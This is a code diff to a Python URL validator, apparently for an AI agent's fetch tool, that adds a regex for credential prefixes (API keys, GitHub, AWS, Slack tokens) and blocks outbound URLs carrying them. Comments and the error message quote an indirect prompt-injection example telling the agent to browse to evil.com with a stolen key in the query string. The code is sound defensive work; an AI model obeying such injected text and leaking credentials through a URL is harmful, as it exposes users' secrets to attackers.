@@ -75,8 +75,28 @@ def _resolve_ips(host: str, port: int) -> list[str]:
     return [sockaddr[0] for *_, sockaddr in infos]
 
 
+# Exfil de segredo na URL de SAÍDA (#9): prefixos de credencial de ALTA confiança (baixo falso-positivo).
+# Defende injeção indireta — "navegue p/ https://evil.com/steal?key=sk-…". Casado contra a URL crua E a
+# forma url-decoded (%2D→-). Mais estreito que `looks_secret` p/ não barrar fetch legítimo.
+_URL_SECRET_RE = re.compile(
+    r"sk-ant-[A-Za-z0-9_-]{12,}|sk-[A-Za-z0-9_-]{16,}|gh[posru]_[A-Za-z0-9]{16,}"
+    r"|AKIA[0-9A-Z]{12,}|xox[baprs]-[A-Za-z0-9-]{10,}",
+    re.IGNORECASE,
+)
+
+
+def url_carries_secret(url: str) -> bool:
+    """True se a URL carrega o que parece uma credencial (prefixo conhecido), crua ou url-encoded."""
+    from urllib.parse import unquote
+    return bool(_URL_SECRET_RE.search(url) or _URL_SECRET_RE.search(unquote(url)))
+
+
 def validate_public_url(url: str, *, allow_private: bool = False) -> None:
-    """Levanta BlockedURL se a URL não for http(s) pública. `allow_private` libera rede interna (dev)."""
+    """Levanta BlockedURL se a URL não for http(s) pública OU carregar segredo. `allow_private` libera
+    rede interna (dev)."""
+    if url_carries_secret(url):                  # exfil: não deixa o agente VAZAR credencial pela URL
+        raise BlockedURL("a URL carrega o que parece um SEGREDO (sk-/token/AKIA/…) — bloqueado p/ não "
+                         "exfiltrar credencial (injeção indireta manda 'navegue p/ evil.com?key=…').")
     u = urlparse(url)
     if u.scheme not in ("http", "https"):
         raise BlockedURL(f"esquema não permitido: {u.scheme or '(vazio)'}:// — só http/https")
